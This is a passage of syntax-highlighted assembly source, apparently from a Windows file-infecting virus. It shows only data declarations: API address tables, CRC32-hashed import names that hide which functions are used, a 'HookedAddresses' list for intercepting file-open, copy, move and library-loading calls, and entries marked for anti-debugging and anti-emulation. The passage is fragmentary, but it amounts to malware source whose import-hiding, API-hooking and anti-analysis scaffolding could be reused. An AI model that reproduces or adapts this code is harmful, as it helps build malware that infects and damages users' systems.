</span><span class="sc5">ddMapViewOfFile</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddUnmapViewOfFile</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddGetTempPathA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;get windows information</span><span class="sc0">
</span><span class="sc5">ddGetTempFileNameA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddGetSystemDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddGetWindowsDirectoryA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddWritePrivatePFStringA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddGetModuleFileNameA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddGetVersion</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddGetStartupInfoA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;process information</span><span class="sc0">
</span><span class="sc5">ddWaitForSingleObject</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddCreateProcessA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddOpenProcess</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddGetCurrentProcessId</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddCreateMutexA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddReleaseMutex</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddSleep</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddTerminateProcess</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddGetSystemTime</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;date &amp; time functions</span><span class="sc0">
</span><span class="sc5">ddGetTickCount</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddGetFileSize</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddGetFileTime</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddSetFileTime</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddFileTimeToSystemTime</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddSystemTimeToFileTime</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddIsDebuggerPresent</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;anti-debugging &amp; anti-emul</span><span class="sc0">
</span><span class="sc5">ddCreateThread</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddWideCharToMultiByte</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;stringz, characterz</span><span class="sc0">
</span><span class="sc5">ddlstrcat</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddlstrlen</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddIsBadCodePtr</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddGetLastError</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc5">HookedAddresses</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ddCreateFileW</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;opening files APIs</span><span class="sc0">
</span><span class="sc5">ddCreateFileA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddOpenFile</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">dd_lopen</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddCopyFileW</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;Copy/Move files APIs</span><span class="sc0">
</span><span class="sc5">ddCopyFileA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddMoveFileW</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddMoveFileA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddMoveFileExW</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddMoveFileExA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddLoadLibraryW</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;opening libraries APIs</span><span class="sc0">
</span><span class="sc5">ddLoadLibraryA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddLoadLibraryExW</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddLoadLibraryExA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddFreeLibrary</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">

            </span><span class="sc1">; functions from ADVAPI32.DLL library</span><span class="sc0">
    </span><span class="sc5">HookedAddresses_advapi32</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ddCryptAcquireContextA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;Cryptography functions</span><span class="sc0">
</span><span class="sc5">ddCryptExportKey</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddCryptImportKey</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddCryptGetUserKey</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddCryptGetProvParam</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddCryptGenKey</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddCryptEncrypt</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddCryptDecrypt</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddCryptDestroyKey</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddCryptReleaseContext</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddRegOpenKeyExA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;Registry functions</span><span class="sc0">
</span><span class="sc5">ddRegQueryValueExA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddRegQueryInfoKeyA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddRegEnumValueA</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddRegSetValueExA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddRegCreateKeyExA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddRegCloseKey</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">

            </span><span class="sc1">; functions from USER32.DLL library</span><span class="sc0">
    </span><span class="sc5">HookedAddresses_user32</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ddSetTimer</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddKillTimer</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddFindWindowA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddPostMessageA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ddCharUpperBuffA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">


    </span><span class="sc5">FunctionNames</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">szGetProcAddress</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetProcAddress</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szGetModuleHandleA</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetModuleHandleA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szGetDriveTypeA</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetDriveTypeA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szFindFirstFileA</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">FindFirstFileA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szFindNextFileA</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">FindNextFileA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szFindClose</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">FindClose</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szReadFile</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">ReadFile</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szWriteFile</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">WriteFile</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szSetFilePointer</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SetFilePointer</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szSetEndOfFile</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SetEndOfFile</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szCloseHandle</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CloseHandle</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szDeleteFileA</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">DeleteFileA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szSetFileAttributesA</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SetFileAttributesA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szCreateFileMappingA</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CreateFileMappingA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szMapViewOfFile</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">MapViewOfFile</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szUnmapViewOfFile</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">UnmapViewOfFile</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szGetTempPathA</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetTempPathA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szGetTempFileName</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetTempFileNameA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szGetSystemDirectoryA</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetSystemDirectoryA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szGetWindowsDirectoryA</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetWindowsDirectoryA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szWritePrivatePFStringA</span><span class="sc4">:</span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">WritePrivateProfileStringA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szGetModuleFileNameA</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetModuleFileNameA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szGetVersion</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetVersion</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szGetStartupInfoA</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetStartupInfoA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szWaitForSingleObject</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">WaitForSingleObject</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szCreateProcessA</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CreateProcessA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szOpenProcess</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">OpenProcess</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szGetCurrentProcessId</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetCurrentProcessId</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szCreateMutexA</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CreateMutexA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szReleaseMutex</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">ReleaseMutex</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szSleep</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">Sleep</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szTerminateProcess</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">TerminateProcess</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szGetSystemTime</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetSystemTime</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szGetTickCount</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetTickCount</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szGetFileSize</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetFileSize</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szGetFileTime</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetFileTime</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szSetFileTime</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SetFileTime</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szFileTimeToSystemTime</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">FileTimeToSystemTime</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szSystemTimeToFileTime</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SystemTimeToFileTime</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szIsDebuggerPresent</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">IsDebuggerPresent</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szCreateThread</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CreateThread</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szWideCharToMultiByte</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">WideCharToMultiByte</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szlstrcat</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">lstrcat</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szlstrlen</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">lstrlen</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szIsBadCodePtr</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">IsBadCodePtr</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szGetLastError</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GetLastError</span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc5">Hooked_API</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">szCreateFileW</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CreateFileW</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szCreateFileA</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CreateFileA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szOpenFile</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">OpenFile</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">sz_lopen</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">_lopen</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szCopyFileW</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CopyFileW</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szCopyFileA</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CopyFileA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szMoveFIleW</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">MoveFileW</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szMoveFileA</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">MoveFileA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szMoveFileExW</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">MoveFileExW</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szMoveFileExA</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">MoveFileExA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szLoadLibraryW</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">LoadLibraryW</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szLoadLibraryA</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">LoadLibraryA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szLoadLibraryExW</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">LoadLibraryExW</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szLoadLibraryExA</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">LoadLibraryExA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szFreeLibrary</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">FreeLibrary</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"ADVAPI32.DLL"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">advapi32_name</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">
</span><span class="sc5">szCryptAcquireContextA</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CryptAcquireContextA</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szCryptExportKey</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CryptExportKey</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szCryptImportKey</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CryptImportKey</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szCryptGetUserKey</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CryptGetUserKey</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szCryptGetProvParam</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CryptGetProvParam</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szCryptGenKey</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CryptGenKey</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">szCryptEncrypt</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">__macro_CRC32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">CryptEncrypt</span><span class="sc4">&gt;</span><span class="sc0">
